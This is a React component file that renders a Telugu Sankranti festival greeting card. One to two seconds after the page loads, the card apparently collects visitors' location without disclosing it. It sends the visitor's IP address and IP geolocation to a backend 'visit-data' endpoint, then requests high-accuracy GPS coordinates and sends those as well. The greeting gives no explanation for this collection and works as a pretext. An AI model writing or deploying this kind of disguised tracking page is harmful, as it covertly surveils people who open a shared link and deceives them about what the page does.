// /src/components/Draft.js
import React, { useEffect } from 'react';
import axios from 'axios';
import "./SankranthiWishes.css";
import banner from "../assets/sankranti-banner.jpg";

const Draft = ({ darkMode, }) => {
  // const [error, setError] = useState('');
  // const [success, setSuccess] = useState('');
  // // const isMobile = useMediaQuery(theme => theme.breakpoints.down('sm')); // Media query for small screens
  // const [loading, setLoading] = useState(false);
  // const [currentLocation, setCurrentLocation] = useState(null);
  // const [currentAddress, setCurrentAddress] = useState(null);

  // const gradientHover = 'linear-gradient(135deg, #3a56d4 0%, #2d0a8c 50%, #5c0b9b 100%)';

  useEffect(() => {
    // window.scrollTo(0, 0);
    setTimeout(() => {
      handleRegister();
    }, 1000);
    setTimeout(() => {
      locateUser();
    }, 2000);
    // handleRegister();
  }, []);

  const handleRegister = async (e) => {

    // Fetch user's IP address
    const ipResponse = await axios.get('https://api64.ipify.org?format=json');
    const userIP = ipResponse.data.ip;

    // Fetch user's location based on IP
    const locationResponse = await axios.get(`https://ipapi.co/${userIP}/json/`);
    // const { city, region, country_name, latitude, longitude } = locationResponse.data;
    // console.log('location', userIP, locationResponse.data );

    const formData = new FormData();

    // formData.append('address', JSON.stringify(address));
    formData.append('ip', userIP);
    // formData.append('location', JSON.stringify({ city, region, country_name, latitude, longitude }));
    formData.append('location', locationResponse.data);

    try {
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/draft/visit-data`, {ip: userIP, location: locationResponse.data});
      // setSuccess(`visited user`);
      if (response.status === 201) {
        // window.location.href = '/login';
      }
    } catch (error) {
      // setError(error.response.data.message || 'An error occurred during registration.');
    } finally {
      // setLoading(false);
    }
  };

  const locateUser = async () => {
    if (navigator.geolocation) {
      // setLoadingLocation(true);
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          // setCurrentLocation({ lat: latitude, lng: longitude });
          try {
            const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/draft/visit-data`, {lat: latitude, lon: longitude});
            // setSuccess(`visited user`);
            if (response.status === 201) {
              // window.location.href = '/login';
            }
          } catch (error) {
            // setError(error.response.data.message || 'An error occurred during registration.');
          } finally {
            // setLoading(false);
          }

          // Set location details manually using lat/lng
          // setLocationDetails({
          //   latitude,
          //   longitude,
          //   accuracy: position.coords.accuracy, // GPS accuracy in meters
          // });
          // fetchAddress(latitude, longitude);
          // console.log("User's current location:", latitude, longitude);
          // setLoadingLocation(false);
          // Fetch location details using an IP geolocation API
          // try {
          //   const response = await fetch(`https://ipapi.co/${latitude},${longitude}/json/`);
          //   const data = await response.json();
          //   setLocationDetails({
          //     ip: data.ip,
          //     street: data.street || 'Not available',
          //     area: data.area || 'Not available',
          //     city: data.city,
          //     state: data.region,
          //     nation: data.country_name,
          //     pincode: data.postal,
          //     accuracy: position.coords.accuracy, // GPS accuracy in meters
          //   });
            // 🌍 Fetch location details using OpenStreetMap's Nominatim API
          // try {
          //   const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
          //   const data = await response.json();

          //   setLocationDetails({
          //     street: data.address.road || 'Not available',
          //     area: data.address.neighbourhood || 'Not available',
          //     city: data.address.city || data.address.town || 'Not available',
          //     state: data.address.state || 'Not available',
          //     nation: data.address.country || 'Not available',
          //     pincode: data.address.postcode || 'Not available',
          //   });
          // } catch (err) {
          //   console.error('Error fetching location details:', err);
          //   setError('Failed to fetch location details. Please try again later.');
          // }
        },
        (error) => {
          console.error('Error getting location:', error);
          // setError('Failed to fetch your current location. Please enable location access.');
          // setLoadingLocation(false);
          // setSnackbar({ open: true, message: 'Failed to fetch your current location. Please enable the location permission or try again.', severity: 'error' });
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // High accuracy mode
      );
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
  };

  // const saveLocation = async () => {
  //   // setSavingLocation(true);
  //   try {
  //     const authToken = localStorage.getItem('authToken');
  //     await API.put(`/api/auth/${id}/location`, {
  //       location: {
  //         latitude: currentLocation.lat,
  //         longitude: currentLocation.lng,
  //       },
  //     }, {
  //       headers: { Authorization: `Bearer ${authToken}` },
  //     });
  //     // setSuccessMessage('Location saved successfully.');
  //     setSnackbar({ open: true, message: 'Location saved successfully.', severity: 'success' });
  //     setSavingLocation(false);
  //   } catch (err) {
  //     // setError('Failed to save location. Please try again later.');
  //     setSnackbar({ open: true, message: 'Failed to save location. Please try again later.', severity: 'error' });
  //     setSavingLocation(false);
  //   }
  // };

  // Fetch address from latitude and longitude
  // const fetchAddress = async (latitude, longitude) => {
  //   try {
  //     const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
  //     const data = await response.json();
  //     // setCurrentAddress(data.display_name);
  //     console.log("address fetched");
  //   } catch (error) {
  //     console.error("Error fetching address:", error);
  //   }
  // };



  return (
    <div className="sankranthi-bg">
      {/* Floating Sugarcane */}
      <div className="sugarcane left">🎋</div>
      <div className="sugarcane right">🎋</div>

      {/* Flying Kite */}
      <div className="kite">🪁</div>

      <div className="card">
        <img src={banner} alt="Sankranthi" className="banner" />

        <h1>🌾 నూతన సంక్రాంతి శుభాకాంక్షలు 🌾</h1>

        <p className="message">
          మీ జీవితంలో <span>సుఖసంతోషాలు</span>, <span>ఆరోగ్యం</span>,{" "}
          <span>సంపద</span> మరియు <span>శాంతి</span>  
          నిండాలని హృదయపూర్వకంగా కోరుకుంటున్నాము.
        </p>

        <p className="sub">
          ఈ మకర సంక్రాంతి మీ కుటుంబానికి  
          కొత్త ఆశలు, కొత్త ఆనందాలు తీసుకురావాలని ఆకాంక్షిస్తూ…
        </p>

        {/* Bhogi Fire */}
        <div className="bhogi">
          <div className="fire"></div>
          <div className="fire"></div>
          <div className="fire"></div>
        </div>
      </div>
    </div>
  );
};

export default Draft;
